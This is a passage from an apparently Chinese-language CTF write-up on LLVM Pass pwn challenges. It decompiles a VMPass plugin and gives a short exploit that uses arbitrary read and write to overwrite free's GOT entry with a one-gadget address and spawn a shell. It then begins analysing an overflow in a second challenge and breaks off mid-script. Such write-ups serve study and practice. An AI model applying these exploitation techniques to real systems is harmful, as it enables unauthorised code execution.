alt="simpleVM-runonfunction"></p><p>但是可以大致推测一下大概意思就是如果函数名为<code>o0o0o0o0</code>就会进入到sub_6AC0，显然这个函数是核心逻辑所在。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  llvm::BasicBlock *v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  _QWORD v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::begin(a2);<span class="comment">//将第一个基本块的迭代器赋值给v5</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::end(a2);<span class="comment">//结束迭代器赋值给v4</span></span><br><span class="line">    <span class="keyword">if</span> ( (llvm::operator!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )<span class="comment">//如果&amp;v4 v5相等，说明遍历完成，跳出循环</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">//将v3指向当前基本块</span></span><br><span class="line">    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator*(v5);</span><br><span class="line">    sub_6B80(a1, v3);<span class="comment">//传入v3执行函数</span></span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);<span class="comment">//更新v5移动到下一个基本块</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数调用了一个sub_6B80函数，并且传入了一个llvm::BasicBlock类型参数。这段代码干的事情，其实就是遍历了<code>o0o0o0o0</code>函数中的所有基本块（代码块），然后依次将这些基本块传入到sub_6B80中执行。跟进函数。进去之后可以发现其实里面的主逻辑和刚刚分析的是一样的，也是以基本块为单位去逐个进行判断。只不过这次就不是传参后执行函数了，而是直接进行匹配了。我们先来看开始循环之后程序干了什么事情。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::getOpcode(v36) == <span class="number">0x37</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">  <span class="keyword">if</span> ( v35 )</span><br><span class="line">  &#123;</span><br><span class="line">    s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);</span><br><span class="line">    Name = (_QWORD *)llvm::Value::getName(CalledFunction);</span><br><span class="line">    *(_QWORD *)s1 = *Name;</span><br><span class="line">    *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">    *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">    *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>第一个if进行了一个对Opcode的判断，判断是否为0x37，查资料可以得知这个llvm指令对应的IR代码是call。也就以为着，这里大循环其实只对函数调用进行处理，其他的一律不关心。接下来申请了一块堆地址拿来储存后面getName获取到的，被<code>o0o0o0o0</code>函数调用的函数的名字，并且只取了前面四个字节。</p><p>搞清楚这个之后，后面就是对不同被调用函数的处理了，我们这里以pop函数举例分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ArgOperand = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">    v32 = <span class="number">0LL</span>;</span><br><span class="line">    v31 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">    <span class="keyword">if</span> ( v31 )</span><br><span class="line">    &#123;</span><br><span class="line">      ZExtValue = llvm::ConstantInt::getZExtValue(v31);</span><br><span class="line">      <span class="keyword">if</span> ( ZExtValue == <span class="number">1</span> )</span><br><span class="line">        v32 = off_20DFD0;</span><br><span class="line">      <span class="keyword">if</span> ( ZExtValue == <span class="number">2</span> )</span><br><span class="line">        v32 = off_20DFC0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v32 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = off_20DFD8;</span><br><span class="line">      *v32 = *(_QWORD *)*off_20DFD8;</span><br><span class="line">      *v3 -= <span class="number">8LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getNumOperands</code>获取的是函数的操作数数量（包括被调用函数本身和其调用参数），这也就意味着pop函数需要1个参数。<code>ArgOperand = llvm::CallBase::getArgOperand(v35, 0);</code>这句是取第一个参数赋值给ArgOperand。后面对这个参数动态类型转换之后进行了一个判断：如果为1，取off_20DFD0，为2则取off_20DFC0赋值给v32。再到后面3句就很好理解了，简单来说，off_20DFD8相当于sp指针，指向了栈顶，现在将栈顶数据弹出给了v32指向的地址，并且sp指针-8。名副其实的pop函数。</p><p>简单介绍后面的几个函数解析（下面的选择地址指的是第一个参数是1还是2）：</p><ul><li>push：选择一个地址的数据压栈</li><li>store：选择一个地址，将另一个地址指向的地址赋值给自己指向的地址</li><li>load：选择一个地址，将自己指向的地址的数据赋值给另一个地址（是有点绕，自己分析可能还清晰点）</li><li>add：两个参数，选择一个地址，并将数据加上第二个参数</li><li>min：两个参数，选择一个地址，并将数据减去第二个参数</li></ul><p>那其实有这些指令之后思路还算比较清晰：</p><ol><li>利用add将1赋值为got表地址</li><li>利用load取出1中got表指向的地址，拿到libc地址，存到2中</li><li>将2加减一定偏移，使得该地址成为ogg的真实地址</li><li>利用store将2中的ogg地址写回到1也就是got表中</li><li>等到程序执行到那个got表函数，自然而然就可以拿到shell了</li></ol><p>所以其实load函数是一个任意地址读，store是任意地址写。不难注意到在处理完被调用函数之后程序调用了一次free，所以我们选择free的got表进行劫持。</p><p>free的got表在opt程序中的偏移是0x77E100。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> val)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> val)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> num)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> num)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x77E100</span>);</span><br><span class="line">load(<span class="number">1</span>);</span><br><span class="line">min(<span class="number">2</span>, <span class="number">0x9a6d0</span>);</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xe3afe</span>);</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x870</span>);</span><br><span class="line">store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -S exp.c -o exp.ll</span><br><span class="line">./opt -load ./VMPass.so -VMPass exp.ll</span><br></pre></td></tr></table></figure><h2 id="源鲁杯2024-show-me-the-code"><a href="#源鲁杯2024-show-me-the-code" class="headerlink" title="源鲁杯2024 show_me_the_code"></a>源鲁杯2024 show_me_the_code</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="获取正确函数名"><a href="#获取正确函数名" class="headerlink" title="获取正确函数名"></a>获取正确函数名</h4><p>老方法，先定位到runOnFunction，这道题好在他没有抹掉符号表，可以直接找到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode::runOnFunction(</span><br><span class="line">        _anonymous_namespace_::c0oo0o0Ode *this,</span><br><span class="line">        llvm::Function *a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v6[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 Name; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  llvm::Value *v9; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  _anonymous_namespace_::c0oo0o0Ode *v10; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = this;</span><br><span class="line">  v9 = a2;</span><br><span class="line">  secret::init(this);</span><br><span class="line">  Name = llvm::Value::getName(a2);</span><br><span class="line">  v8 = v2;</span><br><span class="line">  VMDatProt::getStrFromProt2(v5, &amp;`anonymous namespace<span class="number">&#x27;</span>::vmFuncName[abi:cxx11], &amp;secret::vmKey[abi:cxx11]);</span><br><span class="line">  llvm::StringRef::StringRef(v6, v5);</span><br><span class="line">  v4 = llvm::operator==(Name, v8, v6[<span class="number">0</span>], v6[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v5);</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    `anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode::vmRun(this, v9);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个定义在匿名命名空间的函数，中间应该是进行了一些解密的操作，然后将解密出来的字符串和传入的函数名对比，如果相等则执行vmRun函数。所以vmRun应该才是核心函数。但是在这之前，我们先用动调将正确的函数名称找出来。</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-%E6%AD%A3%E7%A1%AE%E7%9A%84%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0.png" alt="yl-正确的函数名称"></p><p>正确函数名是<code>_Z10c0deVmMainv</code>。</p><h4 id="opcode分析"><a href="#opcode分析" class="headerlink" title="opcode分析"></a>opcode分析</h4><p>接下来就该看vmRun函数了。核心逻辑识别8种指令：op1-op8。</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-vmRun%E4%B8%BB%E9%80%BB%E8%BE%91.png" alt="yl-vmRun主逻辑"></p><p>每个if都会执行一遍isValidOp，这个函数和runonfunction差不多，也是解密比较函数名字，也就是说，这里要动调确定每个op的函数名。</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-op1.png" alt="yl-op1"></p><p>op1的名称是<code>_ZN4edoc4addiEhii</code>。。。以此类推。如果某个被调用的函数符合名称，那么就会进到一个<code>isValidEnv</code>函数进行检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode::isValidEnv(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 Type; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+7h] [rbp-C9h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">32</span>]; <span class="comment">// [rsp+8h] [rbp-C8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">8</span>]; <span class="comment">// [rsp+28h] [rbp-A8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">32</span>]; <span class="comment">// [rsp+50h] [rbp-80h] BYREF</span></span><br><span class="line">  __int64 v10[<span class="number">2</span>]; <span class="comment">// [rsp+70h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 StructName; <span class="comment">// [rsp+80h] [rbp-50h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+88h] [rbp-48h]</span></span><br><span class="line">  llvm::Type *v13; <span class="comment">// [rsp+90h] [rbp-40h]</span></span><br><span class="line">  llvm::Type *ElementType; <span class="comment">// [rsp+98h] [rbp-38h]</span></span><br><span class="line">  llvm::PointerType *v15; <span class="comment">// [rsp+A0h] [rbp-30h]</span></span><br><span class="line">  llvm::Value *ArgOperand; <span class="comment">// [rsp+A8h] [rbp-28h]</span></span><br><span class="line">  llvm::CallBase *v17; <span class="comment">// [rsp+B0h] [rbp-20h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+B8h] [rbp-18h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+C0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [rsp+CFh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  v19 = a1;</span><br><span class="line">  v18 = a2;</span><br><span class="line">  v17 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;&gt;(a2);</span><br><span class="line">  <span class="keyword">if</span> ( !v17 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  ArgOperand = (llvm::Value *)llvm::CallBase::getArgOperand(v17, <span class="number">0</span>);</span><br><span class="line">  Type = llvm::Value::getType(ArgOperand);</span><br><span class="line">  v15 = (llvm::PointerType *)llvm::dyn_cast&lt;llvm::PointerType,llvm::Type&gt;(Type);</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  ElementType = (llvm::Type *)llvm::PointerType::getElementType(v15);</span><br><span class="line">  <span class="keyword">if</span> ( (llvm::Type::isStructTy(ElementType) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  v13 = (llvm::Type *)llvm::cast&lt;llvm::StructType,llvm::Type&gt;(ElementType);</span><br><span class="line">  StructName = llvm::Type::getStructName(v13);</span><br><span class="line">  v12 = v3;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(v8, <span class="string">&quot;class.&quot;</span>, v7);</span><br><span class="line">  VMDatProt::getStrFromProt2(</span><br><span class="line">    (__int64)v6,</span><br><span class="line">    (__int64)&amp;`anonymous namespace<span class="number">&#x27;</span>::vmEnvName[abi:cxx11],</span><br><span class="line">    (__int64)&amp;secret::vmKey[abi:cxx11]);</span><br><span class="line">  <span class="built_in">std</span>::operator+&lt;<span class="type">char</span>&gt;(v9, v8, v6);</span><br><span class="line">  llvm::StringRef::StringRef(v10, v9);</span><br><span class="line">  v5 = llvm::operator==(StructName, v12, v10[<span class="number">0</span>], v10[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v9);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v8);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(v7);</span><br><span class="line">  <span class="keyword">if</span> ( (v5 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    v20 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_6:</span><br><span class="line">    v20 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v20 &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查了参数类型，要求第一个参数一定是<code>struct *</code>类型的，并且还要求这个结构体是class.edoc。这里的edoc是动调解密得到的。这个名字有点奇怪，因为他是IR代码的表现形式。实际上在cpp当中，这个class.edoc就意味着:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">edoc</span>&#123;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个class似乎并没有什么用，但是调用那些op还必须得有，就是纯纯恶心人的设置。</p><p>然后我们来分析op1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode::op1(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  llvm::Type *Type; <span class="comment">// rax</span></span><br><span class="line">  llvm::Type *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  llvm::ConstantInt *v7; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  llvm::ConstantInt *v8; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  llvm::Value *ArgOperand; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v11[<span class="number">2</span>]; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 ZExtValue; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  llvm::CallBase *v13; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v15 = a1;</span><br><span class="line">  v14 = a2;</span><br><span class="line">  result = llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;&gt;(a2);</span><br><span class="line">  v13 = (llvm::CallBase *)result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::getNumArgOperands(v13); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      ArgOperand = (llvm::Value *)llvm::CallBase::getArgOperand(v13, i);</span><br><span class="line">      Type = (llvm::Type *)llvm::Value::getType(ArgOperand);</span><br><span class="line">      <span class="keyword">if</span> ( (llvm::Type::isIntegerTy(Type, <span class="number">8u</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; i == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">        <span class="keyword">if</span> ( v8 )</span><br><span class="line">          ZExtValue = llvm::ConstantInt::getZExtValue(v8);</span><br><span class="line">      &#125;</span><br><span class="line">      v4 = (llvm::Type *)llvm::Value::getType(ArgOperand);</span><br><span class="line">      <span class="keyword">if</span> ( (llvm::Type::isIntegerTy(v4) &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; i &gt; <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">        <span class="keyword">if</span> ( v7 )</span><br><span class="line">          v11[i - <span class="number">2</span>] = llvm::ConstantInt::getZExtValue(v7);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = ZExtValue;</span><br><span class="line">    <span class="keyword">if</span> ( ZExtValue &lt;= <span class="number">5u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="type">unsigned</span> <span class="type">int</span>)(v11[<span class="number">1</span>] + v11[<span class="number">0</span>]);</span><br><span class="line">      *(_QWORD *)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">unsigned</span> <span class="type">long</span>&gt;::operator[](&amp;secret::regs, ZExtValue) = v6;</span><br><span class="line">      v5 = llvm::errs((llvm *)&amp;secret::regs);</span><br><span class="line">      <span class="keyword">return</span> llvm::raw_ostream::operator&lt;&lt;(v5, <span class="string">&quot;Op1 done.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求第二个参数是8位int类型的。然后后面的参数是int类型的，这些int参数被存到了v11数组中。可以发现这个v11数组只有2个数的空间而已，但是又没有限制参数数量，这里有个溢出的嫌疑。到了下面，限制了int8的数据要小于等于5，然后会将第二第三参数相加，存到regs[int8偏移]中。根据这些信息，我们可以先把op1的声明写出来<code>void _ZN4edoc4addiEhii(edoc *op, int8_t idx, int num1, int num2);</code>。。。以此类题分析出8个op。</p><p>经过折磨的动调和分析，我们可以得到以下脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 